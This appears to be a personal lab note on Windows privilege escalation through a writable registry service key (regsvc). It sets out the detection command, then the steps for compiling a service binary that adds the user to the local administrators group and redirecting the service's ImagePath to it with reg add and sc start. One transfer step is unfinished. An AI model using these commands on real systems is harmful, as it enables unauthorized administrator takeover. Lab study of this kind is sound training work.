#Windows #PrivEsc #Registry #SimpleHTTPServer #msiexec #MSFvenom #metasploit #msfconsole #meterpreter #regsvc

﻿## ﻿﻿﻿﻿**Detection**

Windows VM

1. Open powershell prompt and type: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
2. Notice that the output suggests that user belong to “`NT AUTHORITY\INTERACTIVE`” has “`FullContol`” permission over the registry key.

**Exploitation**

Windows VM

1. Copy ‘`C:\Users\User\Desktop\Tools\Source\windows_service.c`’ to the Kali VM.
- pyftpdlib! [[0_File Transfers]]
	- For transfer from RHOST to LHOST ==resume here==
```

```

Kali VM

1. Open `windows_service.c` in a text editor and replace the command used by the `system()` function to: `cmd.exe /k net localgroup administrators user /add`  
2. Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
		*(NOTE: if this is not installed, use '`sudo apt install gcc-mingw-w64`')* 
1. Copy the generated file `x.exe`, to the Windows VM.

Windows VM

1. Place `x.exe` in ‘`C:\Temp`’.  
2. Open command prompt at type: `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`  
3. In the command prompt type: `sc start regsvc`  
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`

